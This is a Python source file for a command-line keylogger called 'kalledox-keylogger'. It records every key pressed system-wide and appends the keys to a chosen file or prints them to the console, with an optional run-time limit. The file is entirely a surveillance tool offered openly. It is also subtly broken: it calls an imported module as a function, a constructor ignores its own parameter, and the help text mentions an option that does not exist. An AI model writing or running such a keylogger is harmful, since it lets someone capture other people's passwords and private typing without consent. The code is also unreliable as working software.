import argparse
import sys

import keyboard
import timestamp


class Console:
    def __init__(self, rargs):
        self.rargs = args

    def verbose(self, text):
        if self.rargs.verbose:
            print(text)


def file(filename):
    try:
        open(filename, 'a')
    except:
        print('Error: can\'t open file "{}".'.format(filename))
        exit()
    return filename

keys = []

initial_timestamp = timestamp()

parser = argparse.ArgumentParser()

parser.add_argument('-o', '--output',
                    help='define the output keys file.',
                    action='store',
                    type=file)
parser.add_argument('-s', '--stdout',
                    help='define the output keys as the console stdout (incompatible with -q and -v.',
                    action='store_true')
parser.add_argument('-t', '--timeout',
                    help='define the maximum time (in seconds) of keylogger execution.',
                    action='store',
                    type=int)
parser.add_argument('-v', '--verbose',
                    help='make the keylogger print more information at the stdout (incompatible with -q and -s).',
                    action='store_true')

args = parser.parse_args()

if args.verbose and args.stdout:

    print('Error: incompatible parameters -v (or --verbose) and -s (or --stdout)')
    exit()

console = Console(args)

console.verbose('Starting kalledox-keylogger...')


def keyboard_listener(event):
    if event.name == 'space':
        keys.append(' ')
    elif len(event.name) > 1:
        keys.append('[{}]'.format(event.name))
    else:
        keys.append(event.name)
    console.verbose('[*] Key pressed at (timestamp) {}.'.format(event.time))

keyboard.on_press(keyboard_listener)

console.verbose('[*] Ready to use!')

try:
    while 1:
        if args.timeout:
            now = timestamp()
            if now - initial_timestamp >= args.timeout*1000:
                exit()
        if len(keys) != 0:
            key = keys.pop(0)
            if args.output:
                f = open(args.output, 'a')
                if key == '[enter]':
                    f.write(key+'\n')
                else:
                    f.write(key)
                f.close()
            if args.stdout:
                sys.stdout.write(key)
                sys.stdout.flush()
except KeyboardInterrupt:
    print('[*] Quitting...')
    exit()
